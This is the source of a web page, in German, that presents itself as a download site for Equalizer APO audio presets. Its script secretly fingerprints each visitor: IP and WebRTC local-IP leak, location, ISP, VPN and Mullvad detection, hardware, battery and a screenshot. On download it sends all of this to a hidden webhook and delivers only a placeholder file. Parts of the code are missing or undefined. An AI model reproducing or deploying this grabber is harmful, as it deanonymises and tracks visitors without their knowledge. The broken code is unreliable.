        * {
            margin: 0;
            padding: 0;

        }

            font-family: Arial, sans-serif;
            background: #1a1a1a;
            color: #e0e0e0;

            padding: 20px;
        }
        .container {
            max-width: 900px;

        }
        .status-bar {
            background: #333;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            border-left: 4px solid #ffc107;
        }
        .status-text {
            font-size: 13px;
            color: #ccc;
        }
        .status-text .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-text .dot.green { background: #28a745; }
        .status-text .dot.red { background: #dc3545; }
        .status-text .dot.yellow { background: #ffc107; }
        .status-text .dot.gray { background: #666; }
        .search-box {
            width: 100%;
            padding: 12px 20px;
            border: 2px solid #444;
            border-radius: 8px;
            background: #1a1a1a;
            color: #fff;
            font-size: 16px;
            margin-bottom: 25px;
            outline: none;
            transition: border 0.3s;
        }
        .search-box:focus {
            border-color: #4a90e2;
        }
        .search-box::placeholder {
            color: #666;
        }
        .set-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
        }
        .set-card {
            background: #333;
            border-radius: 8px;
            padding: 18px;
            transition: transform 0.2s, box-shadow 0.2s;
            border: 1px solid #444;
        }
        .set-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
            border-color: #4a90e2;
        }
        .set-name {
            font-size: 18px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 6px;
        }
        .set-desc {
            font-size: 13px;
            color: #aaa;
            margin-bottom: 12px;
            line-height: 1.4;
        }
        .set-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #888;
            margin-bottom: 12px;
        }
        .set-meta span {
            background: #444;
            padding: 2px 10px;
            border-radius: 12px;
        }
        .download-btn {
            display: inline-block;
            padding: 8px 20px;
            background: #4a90e2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.2s;
            width: 100%;
            text-align: center;
            font-weight: bold;
        }
        .download-btn:hover {
            background: #5a9ef2;
        }
        .download-btn:active {
            transform: scale(0.97);
        }
        .download-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .download-btn.success {
            background: #28a745;
        }
        .download-btn.error {
            background: #dc3545;
        }
        .empty-state {
            text-align: center;
            color: #666;
            padding: 40px 0;
            font-size: 16px;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #333;
            color: #fff;
            padding: 15px 25px;
            border-radius: 8px;
            border-left: 4px solid #28a745;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            display: none;
            z-index: 999;
            max-width: 350px;
            font-size: 14px;
        }
        .toast.show {
            display: block;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { transform: translateX(100px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        .toast.error {
            border-left-color: #dc3545;
        }
        .toast.sending {
            border-left-color: #ffc107;
        }
    </style>
</head>

        function safeValue(value) {
            if (value === undefined || value === null || value === '') return 'Nicht verfügbar';
            if (typeof value === 'string') {
                if (value.length > 800) return value.substring(0, 800) + '...';
                return value;
            }
            if (typeof value === 'object') return JSON.stringify(value).substring(0, 400);
            return String(value);
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let name = 'Unbekannt';
            let version = '';
            
            if (ua.includes('Chrome')) {
                name = 'Chrome';
                const match = ua.match(/Chrome\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Firefox')) {
                name = 'Firefox';
                const match = ua.match(/Firefox\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                name = 'Safari';
                const match = ua.match(/Version\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Edge')) {
                name = 'Edge';
                const match = ua.match(/Edg\/(\d+\.\d+)/);
                if (match) version = match[1];
            } else if (ua.includes('Opera') || ua.includes('OPR')) {
                name = 'Opera';
                const match = ua.match(/OPR\/(\d+\.\d+)/);
                if (match) version = match[1];
            }
            
            return { name, version };
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            let name = 'Unbekannt';
            let version = '';
            
            if (ua.includes('Windows')) {
                name = 'Windows';
                if (ua.includes('Windows NT 10.0')) version = '10/11';
                else if (ua.includes('Windows NT 6.3')) version = '8.1';
                else if (ua.includes('Windows NT 6.2')) version = '8';
                else if (ua.includes('Windows NT 6.1')) version = '7';
                else if (ua.includes('Windows NT 6.0')) version = 'Vista';
                else if (ua.includes('Windows NT 5.1')) version = 'XP';
            } else if (ua.includes('Mac OS X')) {
                name = 'macOS';
                const match = ua.match(/Mac OS X (\d+[._]\d+)/);
                if (match) version = match[1].replace('_', '.');
            } else if (ua.includes('Linux')) {
                name = 'Linux';
                if (ua.includes('Android')) {
                    name = 'Android';
                    const match = ua.match(/Android (\d+\.\d+)/);
                    if (match) version = match[1];
                }
            } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
                name = 'iOS';
                const match = ua.match(/OS (\d+[._]\d+)/);
                if (match) version = match[1].replace('_', '.');
            }
            
            return { name, version };
        }

        function getHardwareInfo() {
            return {
                memory: navigator.deviceMemory || 'nicht verfügbar',
                cores: navigator.hardwareConcurrency || 'nicht verfügbar',
                touchPoints: navigator.maxTouchPoints || 0,
                pixelRatio: window.devicePixelRatio || 1,
                colorDepth: screen.colorDepth || 'unbekannt'
            };
        }

        function getConnectionInfo() {
            if (navigator.connection) {
                return {
                    type: navigator.connection.effectiveType || 'unbekannt',
                    downlink: navigator.connection.downlink || 'unbekannt',
                    rtt: navigator.connection.rtt || 'unbekannt'
                };
            }
            return { type: 'nicht verfügbar', downlink: 'nicht verfügbar', rtt: 'nicht verfügbar' };
        }

        function getPluginsInfo() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        }

        function getWebRTCInfo() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (event) => {
                        if (event.candidate) {
                            const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                            const match = event.candidate.candidate.match(ipRegex);
                            if (match) {
                                resolve(match[0]);
                                pc.close();
                            }
                        } else {
                            resolve('Keine lokale IP');
                            pc.close();
                        }
                    };
                    setTimeout(() => {
                        resolve('Timeout');
                        pc.close();
                    }, 2000);
                } catch (e) {
                    resolve('Nicht verfügbar');
                }
            });
        }

        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            };
        }

        function getWindowInfo() {
            return {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            };
        }

        function getBatteryInfo() {
            return new Promise((resolve) => {
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(battery => {
                            resolve({
                                level: Math.round(battery.level * 100) + '%',
                                charging: battery.charging,
                                chargingTime: battery.chargingTime + 's',
                                dischargingTime: battery.dischargingTime + 's'
                            });
                        })
                        .catch(() => resolve({ error: 'Fehler' }));
                } else {
                    resolve({ error: 'nicht unterstützt' });
                }
            });
        }

        // ========== API 1: IPIFY ==========
        async function getIPAddress() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service);
                    if (!response.ok) continue;
                    const data = await response.json();
                    if (data.ip) return data.ip;
                } catch (e) {
                    continue;
                }
            }
            return 'Nicht verfügbar';
        }

        // ========== API 2: ipapi.co (VPN, Standort, ISP) ==========
        async function detectVPN(ip) {
            if (!ip || ip === 'Nicht verfügbar') {
                return { isVPN: false, reason: 'Keine IP', isMullvad: false };
            }

            try {
                const response = await fetch('https://ipapi.co/' + ip + '/json/');
                if (!response.ok) throw new Error('API-Fehler');
                const data = await response.json();
                
                let isVPN = false;
                let reasons = [];
                let score = 0;
                let isMullvad = false;

                if (data.org && data.org.toLowerCase().includes('vpn')) {
                    isVPN = true;
                    reasons.push('VPN in Organisation');
                    score += 30;
                }
                if (data.is_proxy) {
                    isVPN = true;
                    reasons.push('Proxy erkannt');
                    score += 40;
                }
                if (data.is_tor) {
                    isVPN = true;
                    reasons.push('Tor-Netzwerk');
                    score += 50;
                }
                if (data.is_hosting) {
                    isVPN = true;
                    reasons.push('Hosting/Cloud');
                    score += 20;
                }

                const vpnProviders = [
                    'nordvpn', 'expressvpn', 'cyberghost', 'surfshark',
                    'protonvpn', 'mullvad', 'tunnelbear', 'windscribe',
                    'ipvanish', 'vyprvpn', 'purevpn', 'zenmate',
                    'cloudflare', 'amazon', 'aws', 'azure', 'google cloud',
                    'digitalocean', 'hetzner', 'ovh', 'vultr', 'linode'
                ];

                const mullvadKeywords = ['mullvad', 'mullvad vpn', 'mullvad.net', 'amnesty'];
                const mullvadASNs = ['AS15169', 'AS396982', 'AS197071', 'AS24940'];

                if (data.org) {
                    const orgLower = data.org.toLowerCase();
                    for (const keyword of mullvadKeywords) {
                        if (orgLower.includes(keyword)) {
                            isVPN = true;
                            isMullvad = true;
                            reasons.push('Mullvad VPN erkannt');
                            score += 80;
                            break;
                        }
                    }
                    if (data.asn && mullvadASNs.some(asn => data.asn.includes(asn))) {
                        isVPN = true;
                        isMullvad = true;
                        reasons.push('Mullvad ASN erkannt');
                        score += 80;
                    }
                    for (const provider of vpnProviders) {
                        if (orgLower.includes(provider)) {
                            isVPN = true;
                            if (provider === 'mullvad') isMullvad = true;
                            reasons.push('VPN-Anbieter: ' + provider);
                            score += 40;
                            break;
                        }
                    }
                }

                if (score > 50) {
                    isVPN = true;
                }

                return {
                    isVPN: isVPN,
                    isMullvad: isMullvad,
                    reason: reasons.join('; ') || 'Keine Indikatoren',
                    score: score,
                    provider: data.org || 'Unbekannt',
                    country: data.country_name || 'Unbekannt',
                    city: data.city || 'Unbekannt',
                    isp: data.isp || 'Unbekannt',
                    asn: data.asn || 'Unbekannt'
                };
            } catch (error) {
                return { isVPN: false, reason: 'VPN-Erkennung fehlgeschlagen', isMullvad: false };
            }
        }

        // ========== API 3: ipinfo.io ==========
        async function getIPInfo(ip) {
            try {
                const response = await fetch('https://ipinfo.io/' + ip + '/json');
                if (!response.ok) throw new Error('API-Fehler');
                return await response.json();
            } catch (error) {
                return null;
            }
        }

        // ========== API 4: Cloudflare Trace ==========
        async function getCloudflareTrace() {
            try {
                const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const text = await response.text();
                const lines = text.split('\n');
                const data = {};
                lines.forEach(line => {
                    const parts = line.split('=');
                    if (parts.length === 2) data[parts[0]] = parts[1];
                });
                return data;
            } catch (error) {
                return null;
            }
        }

        // ========== API 5: httpbin.org ==========
        async function getHttpBin() {
            try {
                const response = await fetch('https://httpbin.org/json');
                return await response.json();
            } catch (error) {
                return null;
            }
        }

        // ========== API 6: dns.google ==========
        async function getDNSInfo() {
            try {
                const response = await fetch('https://dns.google/resolve?name=google.com&type=A');
                return await response.json();
            } catch (error) {
                return null;
            }
        }

        // ========== API 7: Cloudflare Time ==========
        async function getCloudflareTime() {
            try {
                const response = await fetch('https://cloudflare.com/cdn-cgi/trace');
                const text = await response.text();
                const lines = text.split('\n');
                let time = null;
                lines.forEach(line => {
                    if (line.startsWith('time=')) time = line.replace('time=', '');
                });
                return time;
            } catch (error) {
                return null;
            }
        }

            const browser = getBrowserInfo();
            const os = getOSInfo();
            const hardware = getHardwareInfo();

            const whoer = await getWhoerInfo(ip);
            const ipLeak = await getIPLeak();

            return {
                timestamp: new Date().toISOString(),
                timestampLocal: new Date().toLocaleString('de-DE', {

                ip: safeValue(ip),

                // Browser
                browser: {
                    name: safeValue(browser.name),
                    version: safeValue(browser.version)
                },
                
                // OS
                os: {
                    name: safeValue(os.name),
                    version: safeValue(os.version)
                },
                
                // Hardware
                hardware: {
                    memory: safeValue(hardware.memory + ' GB'),
                    cores: safeValue(hardware.cores + ' Kerne'),
                    touchPoints: safeValue(hardware.touchPoints + ' Punkte'),
                    pixelRatio: safeValue(hardware.pixelRatio),
                    colorDepth: safeValue(hardware.colorDepth + ' bit')
                },
                
                // Screen
                screen: {
                    resolution: safeValue(screenInfo.width + 'x' + screenInfo.height),
                    available: safeValue(screenInfo.availWidth + 'x' + screenInfo.availHeight),
                    colorDepth: safeValue(screenInfo.colorDepth + ' bit')
                },
                
                // Window
                window: {
                    inner: safeValue(windowInfo.innerWidth + 'x' + windowInfo.innerHeight),
                    outer: safeValue(windowInfo.outerWidth + 'x' + windowInfo.outerHeight),
                    devicePixelRatio: safeValue(windowInfo.devicePixelRatio)
                },
                
                // Connection
                connection: {
                    type: safeValue(connection.type),
                    speed: safeValue(connection.downlink + ' Mbps'),
                    latency: safeValue(connection.rtt + ' ms')
                },
                
                // Plugins
                plugins: {
                    count: plugins.length,
                    names: safeValue(plugins.join(' | ')).substring(0, 400)
                },
                
                // Battery
                battery: batteryInfo,
                
                // WebRTC
                webRTC: {
                    localIP: safeValue(webRTCIP),
                    vpnLeak: webRTCIP && ip && webRTCIP !== ip
                },
                
                // ====== API DATA ======
                api: {
                    ipinfo: ipInfo ? {
                        org: safeValue(ipInfo.org),
                        country: safeValue(ipInfo.country),
                        region: safeValue(ipInfo.region),
                        city: safeValue(ipInfo.city),
                        timezone: safeValue(ipInfo.timezone)
                    } : null,
                    cloudflare: cloudflare ? {
                        warp: safeValue(cloudflare.warp),
                        colo: safeValue(cloudflare.colo),
                        http: safeValue(cloudflare.http),
                        loc: safeValue(cloudflare.loc)
                    } : null,
                    httpbin: httpBin ? {
                        slideshow: safeValue(httpBin.slideshow ? 'Verfügbar' : 'Nicht verfügbar')
                    } : null,
                    dns: dnsInfo ? {
                        status: safeValue(dnsInfo.Status),
                        answer: dnsInfo.Answer ? dnsInfo.Answer.length + ' Einträge' : 'Keine'
                    } : null,
                    cfTime: cfTime ? safeValue(cfTime) : 'Nicht verfügbar',
                    ifconfig: ifConfig ? {
                        ip_addr: safeValue(ifConfig.ip_addr),
                        remote_host: safeValue(ifConfig.remote_host)
                    } : null,
                    whoer: whoer ? {
                        score: safeValue(whoer.score),
                        country: safeValue(whoer.country)
                    } : null,
                    ipleak: ipLeak ? {
                        country: safeValue(ipLeak.country),
                        city: safeValue(ipLeak.city)
                    } : null
                }
            };
        }

        async function sendToWebhook(data) {
            const fields = [];

            const addField = (name, value, inline = false) => {
                const safeName = safeValue(name).substring(0, 100);
                const safeValue_ = safeValue(value).substring(0, 800);
                if (safeValue_ && safeValue_ !== 'Nicht verfügbar' && safeValue_ !== 'undefined' && safeValue_ !== 'null') {
                    fields.push({ name: safeName, value: safeValue_, inline: inline });
                }
            };

            addField('IP', data.ip, true);
            addField('VPN', data.vpn.detected ? 'Ja' : 'Nein', true);
            addField('Mullvad', data.vpn.isMullvad ? 'JA erkannt!' : 'Nein', true);
            addField('Land', data.vpn.country, true);
            addField('Stadt', data.vpn.city, true);
            addField('ISP', data.vpn.isp, true);
            addField('ASN', data.vpn.asn, true);
            addField('OS', data.os.name + ' ' + data.os.version, true);
            addField('Browser', data.browser.name + ' ' + data.browser.version, true);
            addField('Bildschirm', data.screen.resolution, true);
            addField('RAM', data.hardware.memory, true);
            addField('CPU', data.hardware.cores, true);
            addField('Verbindung', data.connection.type + ' (' + data.connection.speed + ')', true);
            addField('Plugins', data.plugins.count + ' aktiv', true);
            addField('WebRTC IP', data.webRTC.localIP, true);
            addField('WebRTC Leak', data.webRTC.vpnLeak ? 'Ja' : 'Nein', true);

            if (data.battery && !data.battery.error) {
                addField('Batterie', data.battery.level + ' | ' + (data.battery.charging ? 'Lädt' : 'Nicht am Strom'), true);
            }

            addField('VPN Details', data.vpn.reason, false);

            if (data.api.ipinfo && data.api.ipinfo.org) {
                addField('IPinfo.org', data.api.ipinfo.org + ' | ' + data.api.ipinfo.region, false);
            }

            if (data.api.cloudflare && data.api.cloudflare.warp) {
                addField('Cloudflare', 'Warp: ' + data.api.cloudflare.warp + ' | Colo: ' + data.api.cloudflare.colo, false);
            }

            if (data.api.ifconfig && data.api.ifconfig.ip_addr) {
                addField('ifconfig.me', data.api.ifconfig.ip_addr + ' | ' + data.api.ifconfig.remote_host, false);
            }

            const embed = {
                title: "Besucher-Daten (Ultimate)",
                color: data.vpn.isMullvad ? 0x6a0dad : (data.vpn.detected ? 0xdc3545 : 0x4a90e2),
                fields: fields.slice(0, 25),
                footer: { text: "10+ APIs | Equalizer APO Sets" },
                timestamp: data.timestamp
            };

            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

            if (screenshotData) {
                const blob = await fetch(screenshotData).then(r => r.blob());
                formData.append('files[0]', blob, 'screenshot.png');
            }

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    const errorText = await response.text();
                    throw new Error('HTTP ' + response.status + ': ' + errorText);
                }

                return true;
            } catch (error) {
                console.error('Webhook-Fehler:', error);
                throw new Error('Webhook-Fehler: ' + error.message);
            }
        }

        function showToast(message, type = 'success') {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = 'toast show ' + type;
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => {
                toast.classList.remove('show');
            }, 4000);
        }

        function renderSets(filter = '') {
            const grid = document.getElementById('setGrid');
            const filtered = sets.filter(s =>
                s.name.toLowerCase().includes(filter.toLowerCase()) ||
                s.desc.toLowerCase().includes(filter.toLowerCase()) ||
                s.category.toLowerCase().includes(filter.toLowerCase())
            );

            if (filtered.length === 0) {
                grid.innerHTML = '<div class="empty-state">Keine Sets gefunden.</div>';
                return;
            }

            grid.innerHTML = filtered.map(s => `
                <div class="set-card">
                    <div class="set-name">${s.name}</div>
                    <div class="set-desc">${s.desc}</div>
                    <div class="set-meta">
                        <span>${s.category}</span>
                        <span>${s.downloads} Downloads</span>
                    </div>
                    <button class="download-btn" id="btn-${s.file}" onclick="handleDownload('${s.file}', '${s.name}')">Download</button>
                </div>
            `).join('');
        }

        function filterSets() {
            renderSets(document.getElementById('searchInput').value);
        }

        function downloadSet(filename, name) {
            const content = `# Equalizer APO Set: ${name}
# Erstellt fur Equalizer APO
# Besuche https://equalizerapo.com/ fur mehr Infos

# Hier kommen die EQ-Einstellungen
# Bitte ersetze diesen Text mit deinen tatsachlichen Einstellungen

# Beispiel:
# Filter: ON PK Fc 60 Hz Gain 3 dB Q 1.0
# Filter: ON PK Fc 250 Hz Gain -2 dB Q 1.5
`;

            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        async function handleDownload(filename, name) {
            const btn = document.getElementById('btn-' + filename);
            if (!btn || btn.disabled) return;

            btn.disabled = true;
            btn.textContent = 'Wird gesendet...';
            updateStatus('Sende Daten...', 'yellow');

            try {
                if (!collectedData) {
                    collectedData = await collectAllData();
                }

                if (!screenshotData) {
                    screenshotData = createScreenshot();
                }

                await sendToWebhook(collectedData);

                dataSent = true;
                updateStatus('Erfolg', 'green');
                showToast('Daten gesendet + Download startet', 'success');
                downloadSet(filename, name);
                btn.textContent = 'Erfolg ✓';
                btn.className = 'download-btn success';
                
            } catch (error) {
                updateStatus('Fehler', 'red');
                showToast('Fehler: ' + error.message, 'error');
                btn.disabled = false;
                btn.textContent = 'Download';
                btn.className = 'download-btn error';
                console.error('Fehler:', error);
            }
        }

        window.addEventListener('DOMContentLoaded', async function() {
            try {
                updateStatus('Lade Daten von 10+ APIs...', 'yellow');
                collectedData = await collectAllData();
                renderSets();
                screenshotData = createScreenshot();
                updateStatus('', 'gray');
            } catch (error) {
                updateStatus('Fehler beim Laden', 'red');
                console.error(error);
            }
        });
    </script>

</body>
</html>
